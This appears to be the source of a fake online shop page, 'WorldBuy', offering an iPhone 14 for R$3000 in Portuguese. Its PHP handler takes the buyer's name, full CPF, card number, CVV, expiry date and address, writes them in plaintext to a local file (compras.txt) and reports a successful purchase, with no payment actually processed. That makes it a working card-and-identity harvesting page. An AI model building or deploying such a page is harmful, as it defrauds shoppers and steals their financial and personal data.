<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nome_titular = $_POST['nome_titular'];
    $cpf = $_POST['cpf'];
    $numero_cartao = $_POST['numero_cartao'];
    $cvv = $_POST['cvv'];
    $data_vencimento = $_POST['data_vencimento'];
    $endereco = $_POST['endereco'];
    $parcelamento = $_POST['parcelamento'];

    $info = "Nome do Cartão: $nome_cartao\n";
    $info .= "Nome do Titular: $nome_titular\n";
    $info .= "CPF: $cpf\n";
    $info .= "Número do Cartão: $numero_cartao\n";
    $info .= "CVV: $cvv\n";
    $info .= "Data de Vencimento: $data_vencimento\n";
    $info .= "Endereço: $endereco\n";
    $info .= "Parcelamento: $parcelamento\n";
    $info .= "-------------------------\n";
    file_put_contents("compras.txt", $info, FILE_APPEND);

    echo "<script>alert('Compra efetuada com sucesso!');</script>";
}
?>



<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compra - WorldBuy</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css" rel="stylesheet" />
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,wght@0,600;1,600&amp;display=swap" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Mulish:ital,wght@0,300;0,500;0,600;0,700;1,300;1,500;1,600;1,700&amp;display=swap" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Kanit:ital,wght@0,400;1,400&amp;display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="comprar.css">
    </head>
<body>
    <div class="container">
        <h1>iPhone 14 (COR ALEATÓRIA)</h1>
        <img src="https://cdsassets.apple.com/live/SZLF0YNV/images/sp/111850_iphone-14_1.png" alt="iPhone 14">
        <h2>R$3000</h2>
        <p>Parcelamento em 12x sem juros de R$250,00</p>

        <form method="post" action="comprar.php">
            <input type="text" name="nome_titular" placeholder="Nome do Titular" required>
            <input type="text" name="cpf" placeholder="CPF Completo" required>
            <input type="text" name="numero_cartao" placeholder="Número do Cartão" required>
            <input type="text" name="cvv" placeholder="CVV" required>
            <input type="text" name="data_vencimento" placeholder="Data de Vencimento (MM/AA)" required>
            <input type="text" name="endereco" placeholder="Endereço" required>

            <select name="parcelamento" required>
                <option value="1x">1x - R$3000</option>
                <option value="2x">2x - R$1500</option>
                <option value="3x">3x - R$1000</option>
                <option value="4x">4x - R$750</option>
                <option value="5x">5x - R$600</option>
                <option value="6x">6x - R$500</option>
                <option value="7x">7x - R$428,57</option>
                <option value="8x">8x - R$375</option>
                <option value="9x">9x - R$333,33</option>
                <option value="10x">10x - R$300</option>
                <option value="11x">11x - R$272,73</option>
                <option value="12x">12x - R$250</option>
            </select><br>

            <button type="submit">Comprar</button>
        </form>
    </div>
</body>
</html>